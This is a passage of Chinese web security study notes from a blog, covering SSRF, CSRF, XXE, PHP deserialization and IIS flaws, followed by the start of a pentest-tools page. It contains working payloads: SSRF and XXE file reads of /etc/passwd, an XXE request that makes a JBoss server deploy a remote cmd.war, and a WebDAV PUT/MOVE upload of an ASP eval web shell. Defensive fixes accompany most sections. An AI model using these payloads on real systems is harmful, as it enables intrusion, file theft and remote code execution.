端口检测（自连测端口），返回mysql数据库版本信息则是开启，没有返回或长时间不返回则是未开启</span></span><br><span class="line">?url = http:<span class="comment">//127.0.0.1:3306</span></span><br><span class="line"><span class="comment"># 读取文件</span></span><br><span class="line">?url = file:<span class="comment">///etc//passwd</span></span><br><span class="line">?file = file:<span class="comment">///c:/windows/win.ini</span></span><br><span class="line"><span class="comment"># 访问首页</span></span><br><span class="line">?url = gopher:<span class="comment">//127.0.0.1:80/_GET%20%2findex.php</span></span><br><span class="line"><span class="comment"># jmx控制台</span></span><br><span class="line">?url = http:<span class="comment">//ip:port/jmx-console/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># php为协议</span></span><br><span class="line">?url = ?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=ssrf.php</span></span><br></pre></td></tr></table></figure><h3 id="2-防护"><a href="#2-防护" class="headerlink" title="2 防护"></a>2 防护</h3><ol><li>过滤请求协议，只允许 http 或者 https 开头的协议。</li><li>严格限制访问的 IP 地址，只允许访问特定 IP 地址。</li><li>限制访问的端口，只允许访问特定的端口。</li><li>设置统一的错误信息，防止造成信息泄露。</li></ol><hr><h2 id="十、CSRF剖析"><a href="#十、CSRF剖析" class="headerlink" title="十、CSRF剖析"></a>十、CSRF剖析</h2><h3 id="1-利用-1"><a href="#1-利用-1" class="headerlink" title="1 利用"></a>1 利用</h3><blockquote><p>定义：借用户的权限完成攻击。</p><p>CSRF与XSS的区别：CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，然后实施破坏。</p></blockquote><h3 id="2-防护-1"><a href="#2-防护-1" class="headerlink" title="2 防护"></a>2 防护</h3><ol><li>验证HTTP Referer字段</li><li>Token验证</li><li>添加验证码</li></ol><hr><h2 id="十一、XXE漏洞"><a href="#十一、XXE漏洞" class="headerlink" title="十一、XXE漏洞"></a>十一、XXE漏洞</h2><blockquote><p>应用程序在解析XML时没有过滤外部实体的加载，导致加载了恶意的外部文件，造成执行命令、读取文件、扫描内网、攻击内网等危害</p><p>windows换行：回车（CR）+换行（LF）</p></blockquote><h3 id="1-XML基础"><a href="#1-XML基础" class="headerlink" title="1 XML基础"></a>1 XML基础</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--XML声明（定义了XML的版本和编码），必须写在第一行--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--version必选，encoding可选--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span> ?&gt;</span></span><br><span class="line"><span class="comment">&lt;!--文档类型定义--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&lt;!DOCTYPE 根元素 [元素声明]--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&lt;!ELEMENT 元素名 类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">to</span> (<span class="keyword">#PCDATA</span>)&gt;</span> </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">from</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">heading</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">body</span> (<span class="keyword">#PCDATA</span>)&gt;</span>]&gt;</span></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--外部文档引用--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--本地--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 <span class="keyword">SYSTEM</span> <span class="string">&quot;文件名&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;note.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--网络--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 <span class="keyword">PUBLIC</span> “DTD名称” <span class="string">&quot;DTD文档的URL&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span> <span class="keyword">public</span> <span class="string">&quot;-/ctfs/dtd html 4.01/en&quot;</span> <span class="string">&quot;http://www.ctfs-wiki.com/note.dtd&quot;</span></span></span><br></pre></td></tr></table></figure><h3 id="2-XXE漏洞"><a href="#2-XXE漏洞" class="headerlink" title="2 XXE漏洞"></a>2 XXE漏洞</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 示例代码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="variable">$dom</span>=<span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>,LIBXML_NOENT|LIBXML_DTDLOAD);</span><br><span class="line"><span class="variable">$creds</span>=<span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$creds</span>-&gt;username;</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$creds</span>-&gt;password;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;hello &#x27;</span>.<span class="variable">$username</span>;</span><br><span class="line">?</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--文件读取--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">creds</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">username</span> <span class="keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">password</span> <span class="keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xee;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>test<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--内网探测--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=index.php&quot;</span>&gt;</span>]&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--内网应用攻击--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://127.0.0.1:8080/jmx-console/HtmlAdaptor?action=invokeOp&amp;name=jboss.deployment:type=DeploymentScanner,flavor=URL&amp;methodIndex=7&amp;arg0=http://10.2.7.11/cmd.war&quot;</span>&gt;</span>]&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--文件读取，调用伪协议执行命令--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;except://id&quot;</span>&gt;</span>]&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--xxe回显--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span>  <span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [     <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="string">&quot;xxe&quot;</span> &gt;</span> ]&gt;</span>  <span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--读取系统文件--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span>  <span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [     <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/windows/win.ini&quot;</span> &gt;</span> ]&gt;</span>  <span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--读取源码--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span>  <span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [     <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span> &gt;</span> ]&gt;</span>  <span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--端口爆破--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span>  <span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [     <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span> &gt;</span> ]&gt;</span>  <span class="tag">&lt;<span class="name">foo</span>&gt;</span>&amp;xxe<span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span>  <span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [     <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://127.0.0.1:80&quot;</span> &gt;</span> ]&gt;</span>  <span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span>;<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-防护"><a href="#3-防护" class="headerlink" title="3 防护"></a>3 防护</h3><ol><li><p>禁用外部实体</p><blockquote><p>代码中设置 <code>libxml_disable_entity_loader(true)</code></p></blockquote></li><li><p>过滤用户提交的XML数据</p><blockquote><p>过滤关键词为 <code>&lt;! DOCTYPE、&lt;! ENTITY、SYSTEM、PUBLIC</code></p></blockquote></li></ol><hr><h2 id="十二、反序列化漏洞"><a href="#十二、反序列化漏洞" class="headerlink" title="十二、反序列化漏洞"></a>十二、反序列化漏洞</h2><h3 id="1-php反序列化"><a href="#1-php反序列化" class="headerlink" title="1 php反序列化"></a>1 php反序列化</h3><blockquote><p><a href="https://blog.csdn.net/qq_45521281/article/details/105891381">PHP序列化反序列化漏洞总结</a></p></blockquote><h4 id="1-1-序列化知识"><a href="#1-1-序列化知识" class="headerlink" title="1.1 序列化知识"></a>1.1 序列化知识</h4><blockquote><p>序列化：<code>serialize($class);</code></p><p>当序列化对象时，PHP在序列化动作之前调用该对象成员函数<code>__sleep</code>。这样就允许对象在被序列化之前做任何清除操作。</p><p>反序列化：<code>unserialize($class);</code></p><p>若被序列化的变量是一个对象，在重新构造对象后，会自动调用<code>__wakeup</code>成员函数（如果有的话）。</p></blockquote><div class="table-container"><table><thead><tr><th>序列化前</th><th>序列化后</th></tr></thead><tbody><tr><td>NULL</td><td><code>N</code></td></tr><tr><td>boolean</td><td><code>b:0，b:1</code></td></tr><tr><td>integer</td><td><code>i:&lt;num&gt;</code></td></tr><tr><td>double</td><td><code>d:&lt;num&gt;</code></td></tr><tr><td>string</td><td><code>s:&lt;length&gt;:&quot;&lt;value&gt;&quot;</code></td></tr><tr><td>array</td><td><code>a:&lt;len&gt;:&#123;&lt;key1&gt;&lt;value1&gt;...&#125;</code></td></tr><tr><td>object</td><td><code>O:&lt;class_name_length&gt;:&lt;class_name&gt;:&lt;len&gt;:&#123;&lt;field name1&gt;&lt;field value1&gt;...&#125;</code>，只有属性没有字段</td></tr></tbody></table></div><h4 id="1-2-序列化利用"><a href="#1-2-序列化利用" class="headerlink" title="1.2 序列化利用"></a>1.2 序列化利用</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 构造函数</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">__construct</span>([<span class="keyword">mixed</span> <span class="variable">$args</span>[, $...]]);</span><br><span class="line"><span class="comment">// 析构函数</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">__destruct</span>(<span class="keyword">void</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对象被当成字符串使用</span></span><br><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">__toString</span>(<span class="keyword">void</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// unserilize()前调用（序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行）</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">__wakeup</span>();</span><br><span class="line"><span class="comment">// serilize()前调用</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">__sleep</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1.更改对象的&lt;len&gt;值，当序列化字符串中表示对象属性个数的数字值大于真实类中属性的个数时就会跳过__wakeup的执行。</span></span><br></pre></td></tr></table></figure><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 简单案例</span></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">class</span> <span class="title">ease</span>&#123;</span><br><span class="line"><span class="keyword">private</span> $method;</span><br><span class="line"><span class="keyword">private</span> $args;</span><br><span class="line">function __construct($method,$args)</span><br><span class="line">&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;method=$method;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;args=$args;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> ease(<span class="string">&quot;ping&quot;</span>,array(<span class="string">&quot;l&#x27;&#x27;s&quot;</span>));</span><br><span class="line">$b = serialize($a);</span><br><span class="line">echo $b<span class="number">.&#x27;</span>&lt;/br&gt;<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">echo base64_encode(serialize($a));</span></span><br></pre></td></tr></table></figure><h3 id="2-JAVA反序列化"><a href="#2-JAVA反序列化" class="headerlink" title="2 JAVA反序列化"></a>2 JAVA反序列化</h3><hr><h2 id="十三、SSTI模版注入"><a href="#十三、SSTI模版注入" class="headerlink" title="十三、SSTI模版注入"></a>十三、SSTI模版注入</h2><hr><h2 id="十四、中间件漏洞"><a href="#十四、中间件漏洞" class="headerlink" title="十四、中间件漏洞"></a>十四、中间件漏洞</h2><h3 id="1-IIS"><a href="#1-IIS" class="headerlink" title="1 IIS"></a>1 IIS</h3><h4 id="1-1-PUT上传漏洞"><a href="#1-1-PUT上传漏洞" class="headerlink" title="1.1 PUT上传漏洞"></a>1.1 PUT上传漏洞</h4><ul><li><p>IIS6.0 PUT漏洞原因</p><blockquote><p>WebDAV是一种基于 HTTP1.1的通信协议，扩展了方法，让应用程序可以直接对服务器操作，并支持文件 lock 和 unlock ， 还支持文件的版本控制。</p></blockquote><ol><li>IIS Server 在 Web 服务扩展中开启了 WebDAV。</li><li>IIS 配置了可以写入的权限。</li></ol></li><li><p>漏洞利用：</p><ol><li><p>利用 OPTIONS 测试 WebDAV 是否开启</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">OPTIONS</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">HOST:host_ip</span><br></pre></td></tr></table></figure></li><li><p>利用 PUT 协议上传 &lt;%eval request(“123”)%&gt; 的 txt 文件</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/1.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">......（构造包头）</span><br><span class="line"> &lt;%eval request(&quot;123&quot;)%&gt;</span><br></pre></td></tr></table></figure></li><li><p>利用 move 方法将扩展改成 asp</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">MOVE</span> <span class="string">/1.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">HOST:host_ip</span><br><span class="line">Destination:url/shell.asp</span><br></pre></td></tr></table></figure></li></ol></li></ul><h4 id="1-2-短文件名枚举漏洞"><a href="#1-2-短文件名枚举漏洞" class="headerlink" title="1.2 短文件名枚举漏洞"></a>1.2 短文件名枚举漏洞</h4><ul><li><p style="color:red">漏洞原理</p><blockquote><p>…</p><p>例如文件中存在一个名为<code>backup-09df9a1s9d1ga9sdg1as.sql</code>的文件，此时只需要访问<code>http://ip/backup~1.sql</code>就可以访问到。</p></blockquote></li><li><p>漏洞利用</p><blockquote><p>设 IIS6.0，网站根目录存在backup698.txt。</p><ol><li>访问<code>http://ip/a\*~1\*/.aspx</code>，返回400，说明不存在。</li><li>访问<code>http://ip/b\*~1\*/.aspx</code>，返回404，说明存在。</li><li>然后继续试<code>http://ip/ba\*~1\*/.aspx</code>，以此类推。</li><li>判断出前六位之后，去除后面那个*号再测试一次。如果返回404表示是文件夹，400则是文件（因为*是通配符）</li></ol><p>漏洞利用工具：<a href="https://github.com/lijiejie/IIS_shortname_Scanner/pulls">IIS_shortname_Scanner</a></p></blockquote></li></ul><div class="table-container"><table><thead><tr><th>IIS 版本</th><th>URL</th><th>结果/错误信息</th></tr></thead><tbody><tr><td>IIS 6</td><td>/valid*~1*/.aspx</td><td>HTTP 404-File not found</td></tr><tr><td>IIS 6</td><td>/Invalid*~1*/.aspx</td><td>HTTP 400-Bad Request</td></tr><tr><td>IIS 5.x</td><td>/valid*~1*</td><td>HTTP 404-File not found</td></tr><tr><td>IIS 5.x</td><td>/Invalid*~1*</td><td>HTTP 400-Bad Request</td></tr><tr><td>IIS 7.x.NET.2（无出错处理）</td><td>/valid*~1*/</td><td>页面中包含“Error Code 0x00000000”</td></tr><tr><td>IIS 7.x.NET.2（无出错处理）</td><td>/Invalid*~1*/</td><td>页面中包含“Error Code 0x80070002”</td></tr></tbody></table></div><ul><li><p>漏洞修复</p><ol><li><p>关闭NTFS对8.3文件名格式的支持</p><blockquote><p>修改下列的注册列表值为1，然后重启。（此修改只能禁止NTFS对8.3文件名格式的支持，无法移除已经存在的文件的段文件名）</p><p><code>HKLM\STSTEM\CurrentControlSet\Control\FileSystem\NtfsDisable8dot3NameCreation</code></p></blockquote></li><li><p>禁用ASP.NET</p><blockquote><p>IIS管理器——Web服务扩展——ASP.NET禁用</p></blockquote></li><li><p>禁止在url中用”~”以及其Unicode编码。</p></li></ol></li></ul><h4 id="1-3-HTTPS-sys"><a href="#1-3-HTTPS-sys" class="headerlink" title="1.3 HTTPS.sys"></a>1.3 HTTPS.sys</h4><h3 id="2-JBoss"><a href="#2-JBoss" class="headerlink" title="2 JBoss"></a>2 JBoss</h3><ul><li><p>重要目录文件</p></li><li><p>未授权访问</p></li></ul><h3 id="3-Tomcat"><a href="#3-Tomcat" class="headerlink" title="3 Tomcat"></a>3 Tomcat</h3><ul><li><p>弱口令</p></li><li><p>远程代码执行</p></li></ul><h3 id="4-WebLogic"><a href="#4-WebLogic" class="headerlink" title="4 WebLogic"></a>4 WebLogic</h3><ul><li>弱口令</li></ul><hr><h2 id="十五、解析漏洞"><a href="#十五、解析漏洞" class="headerlink" title="十五、解析漏洞"></a>十五、解析漏洞</h2><h3 id="1-Web容器"><a href="#1-Web容器" class="headerlink" title="1 Web容器"></a>1 Web容器</h3><h3 id="2-Apache"><a href="#2-Apache" class="headerlink" title="2 Apache"></a>2 Apache</h3><blockquote><p><a href="https://blog.csdn.net/qq_32261191/article/details/124287798">Struts2 S2-062(CVE-2021-31805)漏洞分析及复现<em>s2漏洞</em>江左盟宗主的博客-CSDN博客</a></p></blockquote><h3 id="3-PHP-CGI"><a href="#3-PHP-CGI" class="headerlink" title="3 PHP CGI"></a>3 PHP CGI</h3><h3 id="4-IIS"><a href="#4-IIS" class="headerlink" title="4 IIS"></a>4 IIS</h3><h3 id="5-Nginx"><a href="#5-Nginx" class="headerlink" title="5 Nginx"></a>5 Nginx</h3><hr><h2 id="十六、数据库漏洞"><a href="#十六、数据库漏洞" class="headerlink" title="十六、数据库漏洞"></a>十六、数据库漏洞</h2><h3 id="1-SQL-Server"><a href="#1-SQL-Server" class="headerlink" title="1 SQL Server"></a>1 SQL Server</h3><h3 id="2-MySQL"><a href="#2-MySQL" class="headerlink" title="2 MySQL"></a>2 MySQL</h3><h3 id="3-Oracle"><a href="#3-Oracle" class="headerlink" title="3 Oracle"></a>3 Oracle</h3><h3 id="4-Redis"><a href="#4-Redis" class="headerlink" title="4 Redis"></a>4 Redis</h3><h3 id="5-漏洞修复"><a href="#5-漏洞修复" class="headerlink" title="5 漏洞修复"></a>5 漏洞修复</h3><hr><h2 id="※十七、代码审计"><a href="#※十七、代码审计" class="headerlink" title="※十七、代码审计"></a>※十七、代码审计</h2><ul><li><p>网页源码</p><ol><li><strong>【命令执行】</strong>cat php|base64：直接显示。</li><li><strong>【命令执行】</strong>使用 cat php 包含网页后可以：网页右键——查看源代码。</li></ol></li><li><p>代码审计工具</p><blockquote><p>C/C++：PC-Lint、JAVA：PMD、.NET：StyleCop、C#：FxCop。</p><p>静态分析—Bug查找：PMD、FindBugs、Coverity、Klocwork。</p></blockquote></li></ul><hr><h2 id="※十八、逻辑漏洞"><a href="#※十八、逻辑漏洞" class="headerlink" title="※十八、逻辑漏洞"></a>※十八、逻辑漏洞</h2><blockquote><p>程序业务或功能上的设计缺陷。</p></blockquote><ol><li><p>越权</p><blockquote><p>本质：某账户拥有了超出它应有权限的范围。</p><p>水平越权：拥有了同等的其他账户的权限。</p><p>垂直越权：拥有了更高账户的权限。</p></blockquote></li></ol>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web渗透工具</title>
      <link href="/posts/5cfe0bd9.html"/>
      <url>/posts/5cfe0bd9.html</url>
      
        <content type="html"><![CDATA[<h1 id="Web渗透工具"><a href="#Web渗透工具" class="headerlink" title="Web渗透工具"></a>Web渗透工具</h1><blockquote><p><a href=".\c5fc2764">text::Kali Linux</a> </p><p><a href=".\54924480">text::Web渗透</a> </p></blockquote><hr><h2 id="一、VMware"><a href="#一、VMware" class="headerlink" title="一、VMware"></a>一、VMware</h2><h3 id="1-网络"><a href="#1-网络" class="headerlink" title="1 网络"></a>1 网络</h3><blockquote><p>编辑——虚拟网络编辑器。（每一个名称相当于一台交换机）</p></blockquote><ul><li>桥接模式：和物理机并列，相当于在物理网中真的加入了一台主机。</li><li>仅主机模式：类似NAT模式，但是默认不连接外界。</li><li>NAT模式：流量通过物理机走向外界。</li></ul><h3 id="2-本地"><a href="#2-本地" class="headerlink" title="2 本地"></a>2 本地</h3><ul><li>虚拟机[右键]——快照——拍摄快照：备份。</li><li>虚拟机[右键]——快照——快到管理器：恢复虚拟机状态。</li><li>虚拟机[右键]——管理——克隆</li><li>文件——导出为OVF：导出</li></ul><h3 id="3-安装"><a href="#3-安装" class="headerlink" title="3 安装"></a>3 安装</h3><ul><li>Win10<ul><li><a href="https://www.bilibili.com/video/BV1W841147At">教程网址</a></li><li><a href="https://www.123pan.com/s/g520Vv-iG2id">工具网址</a></li></ul></li></ul><hr><h2 id="二、浏览器工具"><a href="#二、浏览器工具" class="headerlink" title="二、浏览器工具"></a>二、浏览器工具</h2><h3 id="1-分类"><a href="#1-分类" class="headerlink" title="1 分类"></a>1 分类</h3><ul><li><p>The Searchable Subject Index</p><blockquote><p>索引式搜索，只搜索站点的 Title 和 Meta 信息，无法搜索个人主页。（Yahoo）</p></blockquote></li><li><p>The Full-Text Search Engine</p><blockquote><p>完全内容搜索引擎，通过 Spider 搜索全面的信息。（Google）</p></blockquote></li></ul><h3 id="2-Edge"><a href="#2-Edge" class="headerlink" title="2 Edge"></a>2 Edge</h3><ul><li><p>命令</p><blockquote><p>在url前加 read: 会进入阅读模式。</p><p>edge://surf：摸鱼。</p><p>其他命令同谷歌一样，Edge的内核是谷歌浏览器。</p></blockquote></li><li><p>扩展</p><ul><li>扩展商店<ul><li>广告拦截：adguard 广告拦截器</li><li>允许复制：Simple Allow Copy（已失效）</li><li>下载视频：aix智能下载器</li><li>VPN：Magic VPN || BestGo VPN（可 ChatGPT）</li></ul></li><li>Google Shop<ul><li>chatgpt for google</li><li>WebChatGPT（好像没用）</li></ul></li></ul></li></ul><h3 id="3-Google-Chrome"><a href="#3-Google-Chrome" class="headerlink" title="3  Google Chrome"></a>3  Google Chrome</h3><h4 id="3-1-配置"><a href="#3-1-配置" class="headerlink" title="3.1 配置"></a>3.1 配置</h4><ol><li><p>不安全链接</p><blockquote><p>在当前页面用键盘输入 <code>thisisunsafe</code> ，不是在地址栏输入，就直接敲键盘就行了，页面即会自动刷新进入网页。</p></blockquote></li></ol><h4 id="3-2-常用命令（Edge也可用）"><a href="#3-2-常用命令（Edge也可用）" class="headerlink" title="3.2 常用命令（Edge也可用）"></a>3.2 常用命令（Edge也可用）</h4><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">-&gt; 限制搜索结果为指定位置包含了所有 word 的网址（anchor，正文，标题，url中）</span><br><span class="line">allinanchor / allintext / allintitle / allinurl:word word ...</span><br><span class="line"></span><br><span class="line">-&gt; 限制指定位置包含 word，其他位置包含 other</span><br><span class="line">other incanchor / intext / intitle / inurl:word  ...</span><br><span class="line"></span><br><span class="line">-&gt; 限制主题包含</span><br><span class="line">insubject:&quot;word&quot; ...</span><br><span class="line"></span><br><span class="line">-&gt; 当前 url 的快照（url要求完整（www.baidu.com），cache 与 url 之间不能有空格）</span><br><span class="line">cache:url</span><br><span class="line"></span><br><span class="line">-&gt; 词的定义</span><br><span class="line">define:word</span><br><span class="line"></span><br><span class="line">-&gt; 返回特定文件类型的网页，如：filetype:pdf</span><br><span class="line">filetype:word</span><br><span class="line"></span><br><span class="line">-&gt; 查询网站下关于 other 的信息，例：javascript site:edu.cn，site后不能有空格</span><br><span class="line">other site:url</span><br></pre></td></tr></table></figure><h4 id="3-3-不常用但有用"><a href="#3-3-不常用但有用" class="headerlink" title="3.3 不常用但有用"></a>3.3 不常用但有用</h4><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">---------个人信息----------</span><br><span class="line">-&gt; 作者名或邮箱，一部分或完整</span><br><span class="line">other author:word </span><br><span class="line">例：children author:john author:doe（作者为 John doe 的包含 children 的文章）</span><br><span class="line"></span><br><span class="line">-&gt; 用户组查询，同作者查询</span><br><span class="line">other group:word</span><br><span class="line"></span><br><span class="line">-&gt; 地点查询</span><br><span class="line">other location:word</span><br><span class="line">例：location:canada</span><br><span class="line"></span><br><span class="line">-&gt; 电影查询，仅支持英文Google</span><br><span class="line">movie:word </span><br><span class="line"></span><br><span class="line">-&gt; 安全搜索，不一定安全</span><br><span class="line">safesearch:word</span><br><span class="line"></span><br><span class="line">-&gt; 限定源</span><br><span class="line">other source:word</span><br><span class="line">例：election source:new_york_times</span><br><span class="line"></span><br><span class="line">-&gt; 返回相关股票信息，信息一般来自专业财经网站</span><br><span class="line">stocks:word</span><br><span class="line"></span><br><span class="line">-&gt; 搜索商店 word 中的关键词 other</span><br><span class="line">other store:word</span><br><span class="line"></span><br><span class="line">---------网站信息----------</span><br><span class="line">-&gt; 网站相关信息</span><br><span class="line">info:url</span><br><span class="line">例：info:baidu.com</span><br><span class="line"></span><br><span class="line">-&gt;和 url 做了链接的网站</span><br><span class="line">link:url</span><br><span 